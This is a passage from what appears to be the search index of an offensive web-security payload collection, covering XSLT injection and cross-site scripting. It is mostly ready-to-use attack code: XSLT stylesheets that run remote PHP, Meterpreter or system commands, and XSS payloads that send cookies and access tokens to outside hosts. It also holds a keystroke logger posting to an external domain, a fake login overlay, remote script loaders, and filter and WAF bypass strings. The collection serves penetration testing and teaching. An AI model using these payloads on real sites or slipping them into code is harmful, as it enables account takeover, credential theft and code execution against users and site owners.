'.')\"/&gt;\n&lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</code></pre> <p>Execute a remote php file using <code>assert</code></p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"&gt;\n&lt;body style=\"font-family:Arial;font-size:12pt;background-color:#EEEEEE\"&gt;\n&lt;xsl:variable name=\"payload\"&gt;\ninclude(\"http://10.10.10.10/test.php\")\n        &lt;/xsl:variable&gt;\n&lt;xsl:variable name=\"include\" select=\"php:function('assert',$payload)\"/&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Execute a PHP meterpreter using PHP wrapper.</p> <pre><code>&lt;xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\"&gt;\n&lt;xsl:template match=\"/\"&gt;\n&lt;xsl:variable name=\"eval\"&gt;\neval(base64_decode('Base64-encoded Meterpreter code'))\n                &lt;/xsl:variable&gt;\n&lt;xsl:variable name=\"preg\" select=\"php:function('preg_replace', '/.*/e', $eval, '')\"/&gt;\n&lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</code></pre>"},{"location":"XSLT%20Injection/#remote-code-execution-with-java","title":"Remote Code Execution with Java","text":"<pre><code>  &lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"&gt;\n&lt;xsl:template match=\"/\"&gt;\n&lt;xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/&gt;\n&lt;xsl:variable name=\"process\" select=\"rt:exec($rtobject,'ls')\"/&gt;\n&lt;xsl:variable name=\"processString\" select=\"ob:toString($process)\"/&gt;\n&lt;xsl:value-of select=\"$processString\"/&gt;\n&lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</code></pre> <pre><code>&lt;xml version=\"1.0\"?&gt;\n&lt;xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\"&gt;\n&lt;xsl:template match=\"/\"&gt;\n&lt;xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')\" xmlns:Runtime=\"java:java.lang.Runtime\"/&gt;\n&lt;/xsl:template&gt;.\n&lt;/xsl:stylesheet&gt;\n</code></pre>"},{"location":"XSLT%20Injection/#remote-code-execution-with-native-net","title":"Remote Code Execution with Native .NET","text":"<pre><code>&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:App=\"http://www.tempuri.org/App\"&gt;\n&lt;msxsl:script implements-prefix=\"App\" language=\"C#\"&gt;\n&lt;![CDATA[\n        public string ToShortDateString(string date)\n          {\n              System.Diagnostics.Process.Start(\"cmd.exe\");\n              return \"01/01/2001\";\n          }\n      ]]&gt;\n&lt;/msxsl:script&gt;\n&lt;xsl:template match=\"ArrayOfTest\"&gt;\n&lt;TABLE&gt;\n&lt;xsl:for-each select=\"Test\"&gt;\n&lt;TR&gt;\n&lt;TD&gt;\n&lt;xsl:value-of select=\"App:ToShortDateString(TestDate)\" /&gt;\n&lt;/TD&gt;\n&lt;/TR&gt;\n&lt;/xsl:for-each&gt;\n&lt;/TABLE&gt;\n&lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</code></pre>"},{"location":"XSLT%20Injection/#references","title":"References","text":"<ul> <li>From XSLT code execution to Meterpreter shells - 02 July 2012 - @agarri</li> <li>XSLT Injection - Fortify</li> <li>XSLT Injection Basics - Saxon</li> </ul>"},{"location":"XSS%20Injection/","title":"Cross Site Scripting","text":"<p>Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.</p>"},{"location":"XSS%20Injection/#summary","title":"Summary","text":"<ul> <li>Cross Site Scripting</li> <li>Vulnerability Details</li> <li>Exploit code or POC<ul> <li>Data grabber for XSS</li> <li>CORS</li> <li>UI redressing</li> <li>Javascript keylogger</li> <li>Other ways</li> </ul> </li> <li>Identify an XSS endpoint<ul> <li>Tools</li> </ul> </li> <li>XSS in HTML/Applications<ul> <li>Common Payloads</li> <li>XSS using HTML5 tags</li> <li>XSS using a remote JS</li> <li>XSS in hidden input</li> <li>XSS when payload is reflected capitalized</li> <li>DOM based XSS</li> <li>XSS in JS Context</li> </ul> </li> <li>XSS in wrappers javascript and data URI</li> <li>XSS in files<ul> <li>XSS in XML</li> <li>XSS in SVG</li> <li>XSS in SVG (short)</li> <li>XSS in Markdown</li> <li>XSS in SWF flash application</li> <li>XSS in SWF flash application</li> <li>XSS in CSS</li> </ul> </li> <li>XSS in PostMessage</li> <li>Blind XSS<ul> <li>XSS Hunter</li> <li>Other Blind XSS tools</li> <li>Blind XSS endpoint</li> <li>Tips</li> </ul> </li> <li>Mutated XSS</li> <li>Polyglot XSS</li> <li>Filter Bypass and exotic payloads<ul> <li>Bypass case sensitive</li> <li>Bypass tag blacklist</li> <li>Bypass word blacklist with code evaluation</li> <li>Bypass with incomplete html tag</li> <li>Bypass quotes for string</li> <li>Bypass quotes in script tag</li> <li>Bypass quotes in mousedown event</li> <li>Bypass dot filter</li> <li>Bypass parenthesis for string</li> <li>Bypass parenthesis and semi colon</li> <li>Bypass onxxxx= blacklist</li> <li>Bypass space filter</li> <li>Bypass email filter</li> <li>Bypass document blacklist</li> <li>Bypass document.cookie blacklist</li> <li>Bypass using javascript inside a string</li> <li>Bypass using an alternate way to redirect</li> <li>Bypass using an alternate way to execute an alert</li> <li>Bypass \"&gt;\" using nothing</li> <li>Bypass \"&lt;\" and \"&gt;\" using \uff1c and \uff1e</li> <li>Bypass \";\" using another character</li> <li>Bypass using HTML encoding</li> <li>Bypass using Katana</li> <li>Bypass using Cuneiform</li> <li>Bypass using Lontara</li> <li>Bypass using ECMAScript6</li> <li>Bypass using Octal encoding</li> <li>Bypass using Unicode</li> <li>Bypass using UTF-7</li> <li>Bypass using UTF-8</li> <li>Bypass using UTF-16be</li> <li>Bypass using UTF-32</li> <li>Bypass using BOM</li> <li>Bypass using weird encoding or native interpretation</li> <li>Bypass using jsfuck</li> </ul> </li> <li>CSP Bypass<ul> <li>Bypass CSP using JSONP from Google (Trick by @apfeifer27)</li> <li>Bypass CSP by lab.wallarm.com</li> <li>Bypass CSP by Rhynorater</li> <li>Bypass CSP by @akita_zen</li> <li>Bypass CSP by @404death</li> </ul> </li> <li>Common WAF Bypass<ul> <li>Cloudflare XSS Bypasses by @Bohdan Korzhynskyi</li> <li>25st January 2021</li> <li>21st April 2020</li> <li>22nd August 2019</li> <li>5th June 2019</li> <li>3rd June 2019</li> <li>Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)</li> <li>Cloudflare XSS Bypass - 27th February 2018</li> <li>Chrome Auditor - 9th August 2018</li> <li>Incapsula WAF Bypass by @Alra3ees- 8th March 2018</li> <li>Incapsula WAF Bypass by @c0d3G33k - 11th September 2018</li> <li>Incapsula WAF Bypass by @daveysec - 11th May 2019</li> <li>Akamai WAF Bypass by @zseano - 18th June 2018</li> <li>Akamai WAF Bypass by @s0md3v - 28th October 2018</li> <li>WordFence WAF Bypass by @brutelogic - 12th September 2018</li> <li>Fortiweb WAF Bypass by @rezaduty - 9th July 2019</li> </ul> </li> <li>References</li> </ul>"},{"location":"XSS%20Injection/#vulnerability-details","title":"Vulnerability Details","text":"<p>Cross-Site Scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS allows attackers to inject malicious code into a website, which is then executed in the browser of anyone who visits the site. This can allow attackers to steal sensitive information, such as user login credentials, or to perform other malicious actions.</p> <p>There are 3 main types of XSS attacks:</p> <ul> <li> <p>Reflected XSS: In a reflected XSS attack, the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.</p> </li> <li> <p>Stored XSS: In a stored XSS attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.</p> </li> <li> <p>DOM-based XSS: is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.</p> </li> </ul> <p>To prevent XSS attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.</p>"},{"location":"XSS%20Injection/#exploit-code-or-poc","title":"Exploit code or POC","text":""},{"location":"XSS%20Injection/#data-grabber-for-xss","title":"Data grabber for XSS","text":"<p>Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.</p> <pre><code>&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+document.cookie&lt;/script&gt;\n&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')&lt;/script&gt;\n&lt;script&gt;new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;&lt;/script&gt;\n&lt;script&gt;new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');&lt;/script&gt;\n</code></pre> <p>Write the collected data into a file.</p> <pre><code>&lt;?php\n$cookie = $_GET['c'];\n$fp = fopen('cookies.txt', 'a+');\nfwrite($fp, 'Cookie:' .$cookie.\"\\r\\n\");\nfclose($fp);\n?&gt;\n</code></pre>"},{"location":"XSS%20Injection/#cors","title":"CORS","text":"<pre><code>&lt;script&gt;\nfetch('https://&lt;SESSION&gt;.burpcollaborator.net', {\nmethod: 'POST',\nmode: 'no-cors',\nbody: document.cookie\n});\n&lt;/script&gt;\n</code></pre>"},{"location":"XSS%20Injection/#ui-redressing","title":"UI redressing","text":"<p>Leverage the XSS to modify the HTML content of the page in order to display a fake login form.</p> <pre><code>&lt;script&gt;\nhistory.replaceState(null, null, '../../../login');\ndocument.body.innerHTML = \"&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;h1&gt;Please login to continue&lt;/h1&gt;&lt;form&gt;Username: &lt;input type='text'&gt;Password: &lt;input type='password'&gt;&lt;/form&gt;&lt;input value='submit' type='submit'&gt;\"\n&lt;/script&gt;\n</code></pre>"},{"location":"XSS%20Injection/#javascript-keylogger","title":"Javascript keylogger","text":"<p>Another way to collect sensitive data is to set a javascript keylogger.</p> <pre><code>&lt;img src=x onerror='document.onkeypress=function(e){fetch(\"http://domain.com?k=\"+String.fromCharCode(e.which))},this.remove();'&gt;\n</code></pre>"},{"location":"XSS%20Injection/#other-ways","title":"Other ways","text":"<p>More exploits at http://www.xss-payloads.com/payloads-list.html?a#category=all:</p> <ul> <li>Taking screenshots using XSS and the HTML5 Canvas</li> <li>JavaScript Port Scanner</li> <li>Network Scanner</li> <li>.NET Shell execution</li> <li>Redirect Form</li> <li>Play Music</li> </ul>"},{"location":"XSS%20Injection/#identify-an-xss-endpoint","title":"Identify an XSS endpoint","text":"<p>This payload opens the debugger in the developer console rather than triggering a popup alert box.</p> <pre><code>&lt;script&gt;debugger;&lt;/script&gt;\n</code></pre> <p>Modern applications with content hosting can use sandbox domains</p> <p>to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.</p> <p>For this reason, it's better to use <code>alert(document.domain)</code> or <code>alert(window.origin)</code> rather than <code>alert(1)</code> as default XSS payload in order to know in which scope the XSS is actually executing.</p> <p>Better payload replacing <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>:</p> <pre><code>&lt;script&gt;alert(document.domain.concat(\"\\n\").concat(window.origin))&lt;/script&gt;\n</code></pre> <p>While <code>alert()</code> is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so <code>console.log()</code> can be used instead to display a message in the console of the developer console (doesn't require any interaction).</p> <p>Example:</p> <pre><code>&lt;script&gt;console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))&lt;/script&gt;\n</code></pre> <p>References:</p> <ul> <li>Google Bughunter University - XSS in sandbox domains</li> <li>LiveOverflow Video - DO NOT USE alert(1) for XSS</li> <li>LiveOverflow blog post - DO NOT USE alert(1) for XSS</li> </ul>"},{"location":"XSS%20Injection/#tools","title":"Tools","text":"<p>Most tools are also suitable for blind XSS attacks:</p> <ul> <li>XSSStrike: Very popular but unfortunately not very well maintained</li> <li>xsser: Utilizes a headless browser to detect XSS vulnerabilities</li> <li>Dalfox: Extensive functionality and extremely fast thanks to the implementation in Go</li> <li>XSpear: Similar to Dalfox but based on Ruby</li> <li>domdig: Headless Chrome XSS Tester</li> </ul>"},{"location":"XSS%20Injection/#xss-in-htmlapplications","title":"XSS in HTML/Applications","text":""},{"location":"XSS%20Injection/#common-payloads","title":"Common Payloads","text":"<pre><code>// Basic payload\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;\n\"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;\n\"&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;\n&lt;script&gt;\\u0061lert('22')&lt;/script&gt;\n&lt;script&gt;eval('\\x61lert(\\'33\\')')&lt;/script&gt;\n&lt;script&gt;eval(8680439..toString(30))(983801..toString(36))&lt;/script&gt; //parseInt(\"confirm\",30) == 8680439 &amp;&amp; 8680439..toString(30) == \"confirm\"\n&lt;object/data=\"jav&amp;#x61;sc&amp;#x72;ipt&amp;#x3a;al&amp;#x65;rt&amp;#x28;23&amp;#x29;\"&gt;\n// Img payload\n&lt;img src=x onerror=alert('XSS');&gt;\n&lt;img src=x onerror=alert('XSS')//\n&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;\n&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;\n\"&gt;&lt;img src=x onerror=alert('XSS');&gt;\n\"&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;\n// Svg payload\n&lt;svg\fonload=alert(1)&gt;\n&lt;svg/onload=alert('XSS')&gt;\n&lt;svg onload=alert(1)//\n&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;\n&lt;svg id=alert(1) onload=eval(id)&gt;\n\"&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;\n\"&gt;&lt;svg/onload=alert(/XSS/)\n&lt;svg&gt;&lt;script href=data:,alert(1) /&gt;(`Firefox` is the only browser which allows self closing script)\n&lt;svg&gt;&lt;script&gt;alert('33')\n&lt;svg&gt;&lt;script&gt;alert&amp;lpar;'33'&amp;rpar;\n// Div payload\n&lt;div onpointerover=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerdown=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerenter=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerleave=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointermove=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerout=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n&lt;div onpointerup=\"alert(45)\"&gt;MOVE HERE&lt;/div&gt;\n</code></pre>"},{"location":"XSS%20Injection/#xss-using-html5-tags","title":"XSS using HTML5 tags","text":"<pre><code>&lt;body onload=alert(/XSS/.source)&gt;\n&lt;input autofocus onfocus=alert(1)&gt;\n&lt;select autofocus onfocus=alert(1)&gt;\n&lt;textarea autofocus onfocus=alert(1)&gt;\n&lt;keygen autofocus onfocus=alert(1)&gt;\n&lt;video/poster/onerror=alert(1)&gt;\n&lt;video&gt;&lt;source onerror=\"javascript:alert(1)\"&gt;\n&lt;video src=_ onloadstart=\"alert(1)\"&gt;\n&lt;details/open/ontoggle=\"alert`1`\"&gt;\n&lt;audio src onloadstart=alert(1)&gt;\n&lt;marquee onstart=alert(1)&gt;\n&lt;meter value=2 min=0 max=10 onmouseover=alert(1)&gt;2 out of 10&lt;/meter&gt;\n&lt;body ontouchstart=alert(1)&gt; // Triggers when a finger touch the screen\n&lt;body ontouchend=alert(1)&gt;   // Triggers when a finger is removed from touch screen\n&lt;body ontouchmove=alert(1)&gt;  // When a finger is dragged across the screen.\n</code></pre>"},{"location":"XSS%20Injection/#xss-using-a-remote-js","title":"XSS using a remote JS","text":"<pre><code>&lt;svg/onload='fetch(\"//host/a\").then(r=&gt;r.text().then(t=&gt;eval(t)))'&gt;\n&lt;script src=14.rs&gt;\n// you can also specify an arbitrary payload with 14.rs/#payload\ne.g: 14.rs/#alert(document.domain)\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-hidden-input","title":"XSS in hidden input","text":"<pre><code>&lt;input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"&gt;\nUse CTRL+SHIFT+X to trigger the onclick event\n</code></pre>"},{"location":"XSS%20Injection/#xss-when-payload-is-reflected-capitalized","title":"XSS when payload is reflected capitalized","text":"<pre><code>&lt;IMG SRC=1 ONERROR=&amp;#X61;&amp;#X6C;&amp;#X65;&amp;#X72;&amp;#X74;(1)&gt;\n</code></pre>"},{"location":"XSS%20Injection/#dom-based-xss","title":"DOM based XSS","text":"<p>Based on a DOM XSS sink.</p> <pre><code>#\"&gt;&lt;img src=/ onerror=alert(2)&gt;\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-js-context","title":"XSS in JS Context","text":"<pre><code>-(confirm)(document.domain)//\n; alert(1);//\n// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-wrappers-javascript-and-data-uri","title":"XSS in wrappers javascript and data URI","text":"<p>XSS with javascript:</p> <pre><code>javascript:prompt(1)\n%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341\n&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#99&amp;#111&amp;#110&amp;#102&amp;#105&amp;#114&amp;#109&amp;#40&amp;#49&amp;#41\nWe can encode the \"javascript:\" in Hex/Octal\n\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)\n\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)\n\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)\nWe can use a 'newline character'\njava%0ascript:alert(1)   - LF (\\n)\njava%09script:alert(1)   - Horizontal tab (\\t)\njava%0dscript:alert(1)   - CR (\\r)\nUsing the escape character\n\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)\nUsing the newline and a comment //\njavascript://%0Aalert(1)\njavascript://anything%0D%0A%0D%0Awindow.alert(1)\n</code></pre> <p>XSS with data:</p> <pre><code>data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;\ndata:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+\n&lt;script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"&gt;&lt;/script&gt;\n</code></pre> <p>XSS with vbscript: only IE</p> <pre><code>vbscript:msgbox(\"XSS\")\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-files","title":"XSS in files","text":"<p> NOTE: The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.</p> <pre><code>&lt;name&gt;\n&lt;value&gt;&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;&lt;/value&gt;\n&lt;/name&gt;\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-xml","title":"XSS in XML","text":"<pre><code>&lt;html&gt;\n&lt;head&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;something:script xmlns:something=\"http://www.w3.org/1999/xhtml\"&gt;alert(1)&lt;/something:script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-svg","title":"XSS in SVG","text":"<pre><code>&lt;?xml version=\"1.0\" standalone=\"no\"?&gt;\n&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;\n&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n&lt;polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/&gt;\n&lt;script type=\"text/javascript\"&gt;\nalert(document.domain);\n  &lt;/script&gt;\n&lt;/svg&gt;\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-svg-short","title":"XSS in SVG (short)","text":"<pre><code>&lt;svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/&gt;\n&lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;\n&lt;svg&gt;&lt;foreignObject&gt;&lt;![CDATA[&lt;/foreignObject&gt;&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;&lt;/svg&gt;\n&lt;svg&gt;&lt;title&gt;&lt;![CDATA[&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;]]&gt;&lt;/svg&gt;\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-markdown","title":"XSS in Markdown","text":"<pre><code>[a](javascript:prompt(document.cookie))\n[a](j a v a s c r i p t:prompt(document.cookie))\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[a](javascript:window.onerror=alert;throw%201)\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-swf-flash-application","title":"XSS in SWF flash application","text":"<pre><code>Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);\nIE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(\u2018?js=history.go(-1)\u2019,\u2019_self\u2019);}\nIE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(\u2018invalidfileinvalidfileinvalidfile\u2019,\u2019target\u2019);setTimeout(\u2018alert(w.document.location);w.close();\u2019,1);\n</code></pre> <p>more payloads in ./files</p>"},{"location":"XSS%20Injection/#xss-in-swf-flash-application_1","title":"XSS in SWF flash application","text":"<pre><code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`\nflashmediaelement.swf?jsinitfunctio%25gn=alert(1)\nZeroClipboard.swf?id=\\\"))} catch(e) {alert(1);}//&amp;width=1000&amp;height=1000\nswfupload.swf?movieName=\"]);}catch(e){}if(!self.a)self.a=!alert(1);//\nswfupload.swf?buttonText=test&lt;a href=\"javascript:confirm(1)\"&gt;&lt;img src=\"https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg\"/&gt;&lt;/a&gt;&amp;.swf\nplupload.flash.swf?%#target%g=alert&amp;uid%g=XSS&amp;\nmoxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true\nvideo-js.swf?readyFunction=alert(1)\nplayer.swf?playerready=alert(document.cookie)\nplayer.swf?tracecall=alert(document.cookie)\nbanner.swf?clickTAG=javascript:alert(1);//\nio.swf?yid=\\\"));}catch(e){alert(1);}//\nvideo-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29\nbookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4\nflashcanvas.swf?id=test\\\"));}catch(e){alert(document.domain)}//\nphpmyadmin/js/canvg/flashcanvas.swf?id=test\\\u201d));}catch(e){alert(document.domain)}//\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-css","title":"XSS in CSS","text":"<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;style&gt;\ndiv  {\nbackground-image: url(\"data:image/jpg;base64,&lt;\\/style&gt;&lt;svg/onload=alert(document.domain)&gt;\");\nbackground-color: #cccccc;\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div&gt;lol&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"XSS%20Injection/#xss-in-postmessage","title":"XSS in PostMessage","text":"<p>If the target origin is asterisk * the message can be sent to any domain has reference to the child page.</p> <pre><code>&lt;html&gt;\n&lt;body&gt;\n&lt;input type=button value=\"Click Me\" id=\"btn\"&gt;\n&lt;/body&gt;\n&lt;script&gt;\ndocument.getElementById('btn').onclick = function(e){\nwindow.poc = window.open('http://www.redacted.com/#login');\nsetTimeout(function(){\nwindow.poc.postMessage(\n{\n\"sender\": \"accounts\",\n\"url\": \"javascript:confirm('XSS')\",\n},\n'*'\n);\n}, 2000);\n}\n&lt;/script&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"XSS%20Injection/#blind-xss","title":"Blind XSS","text":""},{"location":"XSS%20Injection/#xss-hunter","title":"XSS Hunter","text":"<p>XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.</p> <p>XSS Hunter is deprecated, it was available at https://xsshunter.com/app. </p> <p>You can set up an alternative version  * Self-hosted version from mandatoryprogrammer/xsshunter-express * Hosted on xsshunter.trufflesecurity.com</p> <pre><code>\"&gt;&lt;script src=\"https://js.rip/&lt;custom.name&gt;\"&gt;&lt;/script&gt;\n\"&gt;&lt;script src=//&lt;custom.subdomain&gt;.xss.ht&gt;&lt;/script&gt;\n&lt;script&gt;$.getScript(\"//&lt;custom.subdomain&gt;.xss.ht\")&lt;/script&gt;\n</code></pre>"},{"location":"XSS%20Injection/#other-blind-xss-tools","title":"Other Blind XSS tools","text":"<ul> <li>sleepy-puppy - Netflix</li> <li>bXSS - LewisArdern</li> <li>ezXSS - ssl</li> </ul>"},{"location":"XSS%20Injection/#blind-xss-endpoint","title":"Blind XSS endpoint","text":"<ul> <li>Contact forms</li> <li>Ticket support</li> <li>Referer Header</li> <li>Custom Site Analytics</li> <li>Administrative Panel logs</li> <li>User Agent</li> <li>Custom Site Analytics</li> <li>Administrative Panel logs</li> <li>Comment Box</li> <li>Administrative Panel</li> </ul>"},{"location":"XSS%20Injection/#tips","title":"Tips","text":"<p>You can use a Data grabber for XSS and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.</p> <p>Eg. payload</p> <pre><code>&lt;script&gt;document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain&lt;/script&gt;\n</code></pre> <p>Eg. one-line HTTP server:</p> <pre><code>$ ruby -run -ehttpd . -p8080\n</code></pre>"},{"location":"XSS%20Injection/#mutated-xss","title":"Mutated XSS","text":"<p>Use browsers quirks to recreate some HTML tags when it is inside an <code>element.innerHTML</code>.</p> <p>Mutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/.</p> <pre><code>&lt;noscript&gt;&lt;p title=\"&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;\"&gt;\n</code></pre>"},{"location":"XSS%20Injection/#polyglot-xss","title":"Polyglot XSS","text":"<p>Polyglot XSS - 0xsobky</p> <pre><code>jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3e\n</code></pre> <p>Polyglot XSS - Ashar Javed</p> <pre><code>\"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;\" &gt;&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;\" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;&lt;img/id=\"confirm&amp;lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&amp;%23x29;&gt;'\"&gt;&lt;img src=\"http: //i.imgur.com/P8mL8.jpg\"&gt;\n</code></pre> <p>Polyglot XSS - Mathias Karlsson</p> <pre><code>\" onclick=alert(1)//&lt;button \u2018 onclick=alert(1)//&gt; */ alert(1)//\n</code></pre> <p>Polyglot XSS - Rsnake</p> <pre><code>';alert(String.fromCharCode(88,83,83))//';alert(String. 